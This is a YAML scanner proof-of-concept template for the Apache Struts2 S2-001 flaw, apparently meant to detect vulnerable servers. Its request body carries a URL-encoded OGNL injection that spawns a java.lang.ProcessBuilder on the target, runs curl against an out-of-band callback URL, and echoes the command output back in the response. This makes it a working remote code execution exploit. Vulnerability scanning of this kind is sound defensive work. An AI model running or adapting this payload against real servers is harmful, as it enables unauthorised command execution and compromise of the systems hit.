name: poc-yaml-s2-001
set:
  reverse: newReverse()
  reverseURL: reverse.url

rules:
  - method: POST
    path: /login.action
    headers:
      User-Agent: >-
        Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
        like Gecko)
    body: >-
      username=1&password=%25%7b%23a%3d(new+java.lang.ProcessBuilder(new+java.lang.String%5b%5d%7b%22curl%22%2c%22{{reverseURL}}%22%7d)).redirectErrorStream(true).start()%2c%23b%3d%23a.getInputStream()%2c%23c%3dnew+java.io.InputStreamReader(%23b)%2c%23d%3dnew+java.io.BufferedReader(%23c)%2c%23e%3dnew+char%5b50000%5d%2c%23d.read(%23e)%2c%23f%3d%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22)%2c%23f.getWriter().println(new+java.lang.String(%23e))%2c%23f.getWriter().flush()%2c%23f.getWriter().close()%7d
    follow_redirects: false
    expression: |
      response.status == 200 && reverse.wait(5)

detail:
  author: aoteman
  links: 
    - https://github.com/vulhub/vulhub/blob/master/struts2/s2-001/README.zh-cn.md